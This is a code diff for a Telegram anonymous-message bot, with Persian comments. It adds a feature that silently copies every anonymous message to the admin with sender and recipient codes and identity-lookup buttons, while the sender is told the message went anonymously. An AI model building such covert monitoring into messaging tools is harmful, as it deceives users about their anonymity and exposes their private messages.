@@ -262,30 +262,38 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states.pop(user_id, None)
             return
 
-        # ساخت کیبورد زیر پیام
-        buttons = [
+        # کیبورد کاربر عادی
+        user_keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("💬 پاسخ", callback_data=f"reply_{sender_code}"),
              InlineKeyboardButton("❤️ ری‌اکشن", callback_data=f"react_{sender_code}")],
             [InlineKeyboardButton("🚫 بلاک این فرستنده", callback_data=f"block_{sender_code}")]
-        ]
+        ])
 
-        # اگر گیرنده ادمین باشد، دکمه استعلام هویت فرستنده هم اضافه می‌شود
-        if target_id == ADMIN_ID:
-            buttons.append([InlineKeyboardButton("🔍 هویت فرستنده (ادمین)", callback_data=f"checkuser_{sender_code}")])
-
-        keyboard = InlineKeyboardMarkup(buttons)
+        # کیبورد اختصاصی مانیتورینگ ادمین
+        admin_keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔍 هویت فرستنده", callback_data=f"checkuser_{sender_code}"),
+             InlineKeyboardButton("🔍 هویت گیرنده", callback_data=f"checkuser_{target_code}")]
+        ])
 
         if target_id:
             try:
-                # قالب هدر پیام طبق خواسته شما: کد فرستنده و کد گیرنده
-                header_text = (
-                    f"📩 **پیام ناشناس جدید**\n\n"
-                    f"👤 **فرستنده (کد):** `{sender_code}`\n"
-                    f"🎯 **گیرنده (کد):** `{target_code}`\n"
-                    f"👇 **پیام:**"
-                )
-                await context.bot.send_message(chat_id=target_id, text=header_text, parse_mode="Markdown")
-                await update.message.copy(chat_id=target_id, reply_markup=keyboard)
+                # پیام ساده و شیک برای کاربر معمولی
+                user_msg_text = f"📩 **پیام ناشناس جدید از طرف کاربر (کد: `{sender_code}`):**"
+                
+                await context.bot.send_message(chat_id=target_id, text=user_msg_text, parse_mode="Markdown")
+                await update.message.copy(chat_id=target_id, reply_markup=user_keyboard)
+
+                # گزارش کامل و دقیق اختصاصی برای ادمین
+                if target_id != ADMIN_ID:
+                    admin_header = (
+                        f"👁‍🗨 **[مانیتورینگ ادمین]**\n\n"
+                        f"👤 **فرستنده (کد):** `{sender_code}`\n"
+                        f"🎯 **گیرنده (کد):** `{target_code}`\n"
+                        f"👇 **پیام ارسال‌شده:**"
+                    )
+                    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_header, parse_mode="Markdown")
+                    await update.message.copy(chat_id=ADMIN_ID, reply_markup=admin_keyboard)
+
                 total_messages_count += 1
                 await update.message.reply_text("پیام شما به صورت ناشناس ارسال شد! ✅")
             except:
@@ -302,11 +310,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("🔍 هویت فرستنده (ادمین)", callback_data=f"checkuser_{sender_code}")]
         ])
         
-        admin_code = get_user_code(update.effective_user)
         header_text = (
             f"📩 **پیام جدید پشتیبانی**\n\n"
             f"👤 **فرستنده (کد):** `{sender_code}`\n"
-            f"🎯 **گیرنده (کد):** `پشتیبانی (ادمین)`\n"
+            f"🎯 **گیرنده:** `پشتیبانی (ادمین)`\n"
             f"👇 **پیام:**"
         )
 
